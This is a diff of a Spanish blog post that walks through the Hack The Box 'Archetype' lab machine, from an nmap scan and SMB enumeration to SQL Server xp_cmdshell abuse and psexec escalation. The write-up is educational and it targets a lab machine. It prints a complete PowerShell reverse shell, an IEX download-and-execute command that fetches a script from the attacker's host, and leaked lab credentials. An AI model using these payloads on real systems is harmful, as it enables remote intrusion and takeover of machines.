@@ -13,7 +13,7 @@
 <meta name="keywords" content="cybersecurity, htb, pentest, writeup, htb, cybersecurity, htb, pentest, hacking, writeup, archetype" />
 
 <meta property="og:title" content="Hack-The-Box (0002) &gt; Starting Point &gt; Archetype "/>
-<meta property="og:url" content="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html" />
+<meta property="og:url" content="/hack-the-box-0002-starting-point-archetype-es-MX.html" />
 <meta property="og:description" content="Anotaciones sobre la máquina “Archetype” de la sección “Starting Point” de Hack-The-Box" />
 <meta property="og:site_name" content="Blog de Penserbjorne" />
 <meta property="og:article:author" content="Penserbjorne" />
@@ -25,10 +25,9 @@
         <title>Hack-The-Box (0002) &gt; Starting Point &gt; Archetype  · Blog de Penserbjorne
 </title>
         <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.min.css" rel="stylesheet">
-        <link rel="stylesheet" type="text/css" href="https://penserbjorne.com/theme/css/elegant.prod.css" media="screen">
-        <link rel="stylesheet" type="text/css" href="https://penserbjorne.com/theme/css/custom.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/elegant.prod.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/custom.css" media="screen">
 
-        <link href="https://penserbjorne.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Blog de Penserbjorne - Full Atom Feed" />
 
 
     </head>
@@ -42,18 +41,18 @@
                             <span class="icon-bar"></span>
                             <span class="icon-bar"></span>
                         </a>
-                        <a class="brand" href="https://penserbjorne.com/"><span class=site-name>Blog de Penserbjorne</span></a>
+                        <a class="brand" href="/"><span class=site-name>Blog de Penserbjorne</span></a>
                         <div class="nav-collapse collapse">
                             <ul class="nav pull-right top-menu">
                                 <li >
                                     <a href=
-                                       https://penserbjorne.com
+                                       "/"
                                     >Home</a>
                                 </li>
-                                <li ><a href="https://penserbjorne.com/categories.html">Categories</a></li>
-                                <li ><a href="https://penserbjorne.com/tags.html">Tags</a></li>
-                                <li ><a href="https://penserbjorne.com/archives.html">Archives</a></li>
-                                <li><form class="navbar-search" action="https://penserbjorne.com/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                                <li ><a href="/categories.html">Categories</a></li>
+                                <li ><a href="/tags.html">Tags</a></li>
+                                <li ><a href="/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
                             </ul>
                         </div>
                     </div>
@@ -67,7 +66,7 @@
 <div class="row-fluid">
     <header class="page-header span10 offset2">
         <h1>
-            <a href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html">
+            <a href="/hack-the-box-0002-starting-point-archetype-es-MX.html">
                 Hack-The-Box (0002) > Starting Point > Archetype
             </a>
         </h1>
@@ -81,7 +80,7 @@
 <p>Para comenzar con esta serie de anotaciones sobre la sección <em>Starting Point</em>
 arrancaremos con la máquina <em>Archetype</em>. Si no sabes bien de que hablo te
 recomiendo que primero leas la
-<a href="{filename}./htb-01-starting-point-section.md">entrada anterior</a>.</p>
+<a href="/hack-the-box-0001-starting-point-es-MX.html">entrada anterior</a>.</p>
 <ul>
 <li><strong>Máquina:</strong>&nbsp;Archetype</li>
 <li><strong><span class="caps">SO</span>:</strong>&nbsp;Windows</li>
@@ -98,11 +97,9 @@ los puertos abiertos y el software asociado a&nbsp;estos.</p>
 nmap -sC -sV -p<span class="nv">$ports</span> <span class="m">10</span>.10.10.27
 </code></pre></div>
 
-
 <p>Vamos a revisar la primera&nbsp;linea.</p>
 <div class="highlight"><pre><span></span><code><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span>  -T4 <span class="m">10</span>.10.10.27 <span class="p">|</span> grep ^<span class="o">[</span><span class="m">0</span>-9<span class="o">]</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
 </code></pre></div>
-
 
 <p>La linea anterior crea una variable en <code>bash</code> llamada <code>ports</code> en la cual se
 almacena el resultado de
@@ -151,9 +148,8 @@ PORT      STATE SERVICE
 <span class="m">49667</span>/tcp open  unknown
 <span class="m">49668</span>/tcp open  unknown
 
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">121</span>.13 seconds
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned <span class="k">in</span> <span class="m">121</span>.13 seconds
 </code></pre></div>
-
 
 <p>La salida anterior la pasamos a <code>grep ^[0-9]</code> para que nos muestre solamente
 el listado de lineas donde aparecen puertos, esto para quitar la información
@@ -172,7 +168,6 @@ numéricos que van del 0 al 9. La salida es como se muestra a&nbsp;continuación
 <span class="m">49667</span>/tcp open  unknown
 <span class="m">49668</span>/tcp open  unknown
 </code></pre></div>
-
 
 <p>La salida anterior la pasamos a <code>cut -d '/' -f 1</code> para que extraiga
 exclusivamente el número de los puertos abiertos. Esto se lo indicamos a <code>cut</code>
@@ -202,12 +197,10 @@ campo tendrá la descripción del&nbsp;puerto.</li>
 <span class="m">49669</span>
 </code></pre></div>
 
-
 <p>La salida anterior la pasamos a <code>tr '\n' ','</code> para eliminar los caracteres
 <code>\n</code> y sustituirlos por una coma <code>,</code>. El resultado es el&nbsp;siguiente:</p>
 <div class="highlight"><pre><span></span><code><span class="m">135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,
 </code></pre></div>
-
 
 <p>La salida anterior la pasamos a <code>sed s/,$//</code> para simplemente extraer la
 ultima coma y dejar una lista limpia de puertos abiertos separados por comas.
@@ -218,7 +211,6 @@ la sintaxis <code>s/regexp/replacement/flags</code>. La expresión utilizada bus
 <div class="highlight"><pre><span></span><code><span class="m">135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669
 </code></pre></div>
 
-
 <p>Todo lo anterior es simplemente para entender el primer comando del
 walk-through que básicamente nos arma una lista de puertos abiertos separados
 por&nbsp;comas.</p>
@@ -226,7 +218,6 @@ por&nbsp;comas.</p>
 utilizar en el segundo comando&nbsp;recomendado:</p>
 <div class="highlight"><pre><span></span><code>nmap -sC -sV -p<span class="nv">$ports</span> <span class="m">10</span>.10.10.27
 </code></pre></div>
-
 
 <p>El comando anterior realizará un escaneo en los puertos obtenidos del primer
 comando. La bandera <code>-sV</code> indica a <code>nmap</code> que determine la versión del software
@@ -295,9 +286,8 @@ Host script results:
 <span class="p">|</span>_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">84</span>.18 seconds
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned <span class="k">in</span> <span class="m">84</span>.18 seconds
 </code></pre></div>
-
 
 <p>Hasta este momento ya hemos logrado detectar los puertos abiertos así como el
 software y las versiones que están asociados a&nbsp;estos.</p>
@@ -317,7 +307,6 @@ perteneciente al proyecto
 <p>El comando recomendado&nbsp;es:</p>
 <div class="highlight"><pre><span></span><code>smbclient -N -L <span class="se">\\\\</span><span class="m">10</span>.10.10.27<span class="se">\\</span>
 </code></pre></div>
-
 
 <p>Los parámetros del comando anterior&nbsp;son:</p>
 <ul>
@@ -341,13 +330,11 @@ realidad la sintaxis de <code>DOS</code> lo tomaría como dos barras al inicio y
 SMB1 disabled -- no workgroup available
 </code></pre></div>
 
-
 <p>Revisando la salida del comando podemos observar que hay una carpeta interesante
 llamada <code>backups</code> la cual podria contener información interesante. Procederemos
 a conectarnos a esa carpeta con el comando&nbsp;recomendado:</p>
 <div class="highlight"><pre><span></span><code>smbclient -N <span class="se">\\\\</span><span class="m">10</span>.10.10.27<span class="se">\\</span>backups
 </code></pre></div>
-
 
 <p>De igual manera que en el comando anterior, nos vamos a conectar sin contraseña
 gracias al parámetro <code>-N</code> y hemos eliminado el parámetro <code>-L</code> ya que no queremos
@@ -356,7 +343,6 @@ ver una lista de resultados si no realizar una conexión&nbsp;directa.</p>
 <div class="highlight"><pre><span></span><code>Try <span class="s2">&quot;help&quot;</span> to get a list of possible commands.
 smb: \&gt;
 </code></pre></div>
-
 
 <p>En esta terminal podemos ejecutar comandos básicos, para ver un listado de
 estos podemos utilizar <code>help</code> el cual nos desplegará una salida como la&nbsp;siguiente:</p>
@@ -381,7 +367,6 @@ tdis           tid            utimes         logoff         ..
 !  
 </code></pre></div>
 
-
 <p>Como el objetivo en este momento es encontrar información de utilidad se nos
 recomienda utilizar el comando <code>dir</code> el cual permite listar el contenido de un
 directorio en sistemas basados en <code>DOS</code>, este caso, el directorio&nbsp;actual.</p>
@@ -392,7 +377,6 @@ directorio en sistemas basados en <code>DOS</code>, este caso, el directorio&nbs
 
         10328063 blocks of size 4096. 8243763 blocks available
 </code></pre></div>
-
 
 <p>Del contenido del directorio podemos observar que solamente existe el archivo
 <code>prod.dtsConfig</code>.</p>
@@ -405,7 +389,6 @@ algo de información de este&nbsp;archivo.</p>
 <p>Para ver el contenido del archivo nos recomiendan utilizar el siguiente&nbsp;comando:</p>
 <div class="highlight"><pre><span></span><code>smb: \<span class="p">&gt;</span> get prod.dtsConfig
 </code></pre></div>
-
 
 <p>El comando anterior invoca a la herramienta <code>get</code> la cual se utiliza para
 transferir archivos, por lo cual al ejecutarlo vamos a transferir una copia
@@ -423,11 +406,9 @@ cual nos arrojara el contenido del&nbsp;archivo.</p>
 <span class="nt">&lt;/DTSConfiguration&gt;</span>
 </code></pre></div>
 
-
 <p>Del contenido del archivo anterior nos llaman la atención la siguiente&nbsp;línea:</p>
 <div class="highlight"><pre><span></span><code><span class="nt">&lt;ConfiguredValue&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="nt">&lt;/ConfiguredValue&gt;</span>
 </code></pre></div>
-
 
 <p>La cadena anterior corresponde a la cadena para una conexión <code>SQL</code> asociada al
 usuario <code>ARCHETYPE\sql_svc</code> (de <code>Windows</code>) y su contraseña que es <code>M3g4c0rp123</code>.</p>
@@ -453,7 +434,6 @@ que no viene instalado por defecto en nuestro sistema. Clonamos el&nbsp;repo.</p
 <div class="highlight"><pre><span></span><code>git clone https://github.com/SecureAuthCorp/impacket.git
 </code></pre></div>
 
-
 <p><code>impacket</code> cuenta con algunos scripts de ejemplo en la carpeta <code>/examples</code>, de
 ahí podemos utilizar <code>mssqlclient.py</code> el cual sirve para realizar conexiones a
 servidores de <code>SQL Server</code>.</p>
@@ -461,11 +441,9 @@ servidores de <code>SQL Server</code>.</p>
 <div class="highlight"><pre><span></span><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth<span class="sb">`</span>
 </code></pre></div>
 
-
 <p>Pero en nuestro caso utilizaremos el&nbsp;siguiente:</p>
 <div class="highlight"><pre><span></span><code>python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
 </code></pre></div>
-
 
 <p>Como podemos ver, hemos mandado <code>mssqlclient.py</code> directamente a la entrada de
 <code>Python3</code>, y hemos indicado las&nbsp;banderas:</p>
@@ -491,7 +469,6 @@ Password:
 SQL&gt;
 </code></pre></div>
 
-
 <p>Ya tenemos una conexión en el servidor. Ahora vamos a verificar si tenemos
 permisos de administrador. Para esto podemos utilizar la función
 <a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15">IS_SRVROLEMEMBER</a>
@@ -500,7 +477,6 @@ de un rol especifico del&nbsp;servidor.</p>
 <p>La sintaxis de la función&nbsp;es:</p>
 <div class="highlight"><pre><span></span><code><span class="n">IS_SRVROLEMEMBER</span> <span class="p">(</span> <span class="s1">&#39;role&#39;</span> <span class="p">[</span> <span class="p">,</span> <span class="s1">&#39;login&#39;</span> <span class="p">]</span> <span class="p">)</span>
 </code></pre></div>
-
 
 <p>En la cual tenemos dos&nbsp;argumentos:</p>
 <ul>
@@ -524,13 +500,11 @@ siguiente&nbsp;comando:</p>
 <div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span>
 </code></pre></div>
 
-
 <p>Su salida&nbsp;es:</p>
 <div class="highlight"><pre><span></span><code><span class="c1">-----------   </span>
 
           <span class="mi">1</span>
 </code></pre></div>
-
 
 <p>El cual nos da como salida un valor numérico de <code>1</code> el cual representa que el
 la sesión iniciada es miembro del rol solicitado, osea, tenemos permisos de
@@ -544,7 +518,6 @@ el cual nos permite modificar configuraciones globales del&nbsp;servidor.</p>
              <span class="p">[</span> <span class="o">@</span><span class="n">configvalue</span> <span class="o">=</span> <span class="p">]</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">3</span> <span class="o">|</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">5</span> <span class="o">|</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">7</span>
 </code></pre></div>
 
-
 <p>Como podemos ver toma dos parámetros, el nombre de la configuración y su valor.
 El valor depende directamente de la configuración que estamos modificando. Una
 vez que hemos cambiado alguna configuración es necesario utilizar <code>reconfigure;</code>
@@ -556,7 +529,6 @@ conexión remota. Para esto habilitaremos que se muestren las opciones&nbsp;avan
 <span class="k">SQL</span><span class="o">&gt;</span> <span class="n">reconfigure</span><span class="p">;</span>
 </code></pre></div>
 
-
 <p>Al habilitar que nos muestre las opciones avanzadas podremos ver que hay una
 configuración llamada <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a>
 la cual nos permite invocar una terminal de comandos de Windows y enviarle una
@@ -565,13 +537,11 @@ cadena a&nbsp;ejecutar.</p>
 <span class="n">reconfigure</span><span class="p">;</span>
 </code></pre></div>
 
-
 <p>Ya habilitamos la configuración para utilizar <code>xp_cmdshell</code>, podemos verificar
 los permisos o alcance de nuestra cuenta dentro de <code>Windows</code> utilizando el
 comando <code>whoami</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="n">xp_cmdshell</span> <span class="ss">&quot;whoami&quot;</span>
 </code></pre></div>
-
 
 <p>Su salida&nbsp;es:</p>
 <div class="highlight"><pre><span></span><code><span class="k">output</span>                                                                             
@@ -583,7 +553,6 @@ comando <code>whoami</code>.</p>
 <span class="k">NULL</span>                                                                               
 </code></pre></div>
 
-
 <p>Podemos observar que se nos vuelve a desplegar el usuario <code>archetype\sql_svc</code>,
 esto significa que <code>SQL Server</code> esta corriendo con ese usuario dentro de
 <code>Ẁindows</code>, y podemos ver un <code>NULL</code> lo cual significa que no tiene permisos de&nbsp;administrador.</p>
@@ -591,7 +560,6 @@ esto significa que <code>SQL Server</code> esta corriendo con ese usuario dentro
 <code>PowerShell</code>. Para esto podemos utilizar el siguiente&nbsp;código:</p>
 <div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&quot;10.10.14.3&quot;</span>,443<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, <span class="m">0</span>, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne <span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s2">&quot;# &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
 </code></pre></div>
-
 
 <p>La linea anterior es necesario guardarla en un archivo en tu equipo, vamos a
 llamar al archivo <code>shell.ps1</code>.</p>
@@ -610,7 +578,6 @@ la linea anterior, simplemente queremos que se vea un poco mejor lo que&nbsp;hac
 <span class="nv">$client</span>.Close<span class="o">()</span>
 </code></pre></div>
 
-
 <p>Si observamos, estamos viendo que se crea una conexión a la <span class="caps">IP</span> y el puerto
 especificado, se crea un stream de datos y a partir de aquí se codifica la
 información para poder enviarla a través de la conexión a una terminal&nbsp;remota.</p>
@@ -618,7 +585,6 @@ información para poder enviarla a través de la conexión a una terminal&nbsp;r
 puedes utilizar el siguiente&nbsp;comando:</p>
 <div class="highlight"><pre><span></span><code>ip addr
 </code></pre></div>
-
 
 <p>Con la <span class="caps">IP</span> indicada y el archivo creado, desde la terminal nos dirigimos a la
 carpeta donde guardaste el archivo. Necesitamos enviar el archivo que esta en
@@ -636,13 +602,11 @@ Recuerda que necesitar estar en la carpeta donde guardaste el archivo <code>shel
 <div class="highlight"><pre><span></span><code>python3 -m http.server <span class="m">80</span>
 </code></pre></div>
 
-
 <p>El segundo punto lo podemos hacer utilizando <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>
 la cual es una herramienta para leer o escribir conexiones de red sobre <span class="caps">TCP</span> o <span class="caps">UDP</span>.</p>
 <p>El comando a utilizar&nbsp;es:</p>
 <div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">443</span>
 </code></pre></div>
-
 
 <p>Los parámetros de <code>netcat</code> son los&nbsp;siguientes:</p>
 <ul>
@@ -657,7 +621,6 @@ el cual es un firewall con el que vamos a gestionar los&nbsp;puertos.</p>
 <div class="highlight"><pre><span></span><code>ufw allow from <span class="m">10</span>.10.10.27 proto tcp to any port <span class="m">80</span>,443
 </code></pre></div>
 
-
 <p>Con sus comando estamos indicando que permita (<code>allow</code>) conexiones desde (<code>from</code>)
 la dirección <span class="caps">IP</span> <code>10.10.10.27</code> que es la que estamos atacando mediante el protocolo
 <code>TCP</code> (<code>proto tcp</code>) a los puertos 80 y 443 (<code>to any port 80,443</code>).</p>
@@ -670,27 +633,24 @@ aceptada por <code>netcat</code> y desde ahi ya podremos utilizar la reverse&nbs
 <div class="highlight"><pre><span></span><code>xp_cmdshell <span class="s2">&quot;powershell &quot;</span>IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\&quot;</span>http://10.10.14.3/shell.ps1<span class="se">\&quot;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;</span>
 </code></pre></div>
 
-
 <p>Recuerda actualizar tu dirección <span class="caps">IP</span> en el comando&nbsp;anterior.</p>
 <p>Ya tenemos una reverse shell al usuario en <code>Windows</code>, podemos proceder a extraer
 la bandera de su escritorio. Para esto podemos podemos movernos a su escritorio
 con el comando <code>cd</code> e indicar la&nbsp;ruta.</p>
-<div class="highlight"><pre><span></span><code><span class="err">cd C:\Users\sql_svc\Desktop</span>
+<div class="highlight"><pre><span></span><code>cd C:\Users\sql_svc\Desktop
 </code></pre></div>
-
 
 <p>Aquí podemos ver que se encuentra el archivo <code>user.txt</code> el cual contiene la&nbsp;bandera.</p>
-<div class="highlight"><pre><span></span><code><span class="o">#</span> <span class="n">dir</span>
+<div class="highlight"><pre><span></span><code># dir
 
 
-    <span class="n">Directory</span><span class="p">:</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">sql_svc</span><span class="err">\</span><span class="n">Desktop</span>
+    Directory: C:\Users\sql_svc\Desktop
 
 
-<span class="k">Mode</span>                <span class="n">LastWriteTime</span>         <span class="k">Length</span> <span class="n">Name</span>                                                                  
-<span class="c1">----                -------------         ------ ----                                                                  </span>
-<span class="o">-</span><span class="n">ar</span><span class="c1">---        2/25/2020   6:37 AM             32 user.txt                                                              </span>
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        2/25/2020   6:37 AM             32 user.txt                                                              
 </code></pre></div>
-
 
 <p>Le podemos aplicar un <code>type</code> o un <code>cat</code> al archivo y listo! Tenemos la primer&nbsp;bandera.</p>
 <h2>Privilege&nbsp;Escalation</h2>
@@ -704,11 +664,9 @@ de comandos de <code>PowerShell</code>. Para esto podemos utilizar el siguiente&
 <div class="highlight"><pre><span></span><code><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
 </code></pre></div>
 
-
 <p>La salida del comando anterior nos muestra lo&nbsp;siguiente:</p>
 <div class="highlight"><pre><span></span><code>net.exe use T: <span class="se">\\</span>Archetype<span class="se">\b</span>ackups /user:administrator MEGACORP_4dm1n!!
 </code></pre></div>
-
 
 <p>Con lo anterior podemos observar que el disco <code>backups</code> que encontramos al
 conectarnos por <code>SMB</code> fue mapeado con una cuenta local de administrador, y
@@ -718,7 +676,6 @@ ahora tenemos su&nbsp;contraseña.</p>
 interprete de <code>Python</code>.</p>
 <div class="highlight"><pre><span></span><code>python3 psexec.py administrator@10.10.10.27
 </code></pre></div>
-
 
 <p>Se nos pedirá la contraseña, y después de ingresarla veremos que la conexión
 es satisfactoria, de tal modo que tenemos una terminal con permisos de&nbsp;administrador.</p>
@@ -738,21 +695,18 @@ Microsoft Windows <span class="o">[</span>Version <span class="m">10</span>.0.17
 C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
 </code></pre></div>
 
-
 <p>Verificamos nuestros&nbsp;permisos:</p>
 <div class="highlight"><pre><span></span><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
 nt authority<span class="se">\s</span>ystem
 </code></pre></div>
-
 
 <p>En efecto, tenemso permisos de administrador, y ahora podemos ir al escritorio
 del administrador y extraer la última&nbsp;bandera.</p>
 <div class="highlight"><pre><span></span><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
 </code></pre></div>
 
-
 <div class="highlight"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;dir
- Volume in drive C has no label.
+ Volume <span class="k">in</span> drive C has no label.
  Volume Serial Number is CE13-2325
 
  Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
@@ -764,10 +718,8 @@ del administrador y extraer la última&nbsp;bandera.</p>
                <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>  <span class="m">33</span>,818,599,424 bytes free
 </code></pre></div>
 
-
 <div class="highlight"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
 </code></pre></div>
-
 
 <p>Listo! Tenemos las dos banderas de esta&nbsp;máquina!</p>
 <h2>Fin</h2>
@@ -802,19 +754,19 @@ y seguir aprendiendo poco a&nbsp;poco.</p>
 <time datetime="2021-04-04T00:00:00-06:00">abr 4, 2021</time>
 
             <h4>Category</h4>
-            <a class="category-link" href="https://penserbjorne.com/categories.html#htb-ref">htb</a>
+            <a class="category-link" href="/categories.html#htb-ref">htb</a>
             <h4>Tags</h4>
             <ul class="list-of-tags tags-in-article">
-                <li><a href="https://penserbjorne.com/tags.html#cybersecurity-ref">cybersecurity
+                <li><a href="/tags.html#cybersecurity-ref">cybersecurity
                     <span>2</span>
 </a></li>
-                <li><a href="https://penserbjorne.com/tags.html#htb-ref">htb
+                <li><a href="/tags.html#htb-ref">htb
                     <span>2</span>
 </a></li>
-                <li><a href="https://penserbjorne.com/tags.html#pentest-ref">pentest
+                <li><a href="/tags.html#pentest-ref">pentest
                     <span>2</span>
 </a></li>
-                <li><a href="https://penserbjorne.com/tags.html#writeup-ref">writeup
+                <li><a href="/tags.html#writeup-ref">writeup
                     <span>2</span>
 </a></li>
             </ul>
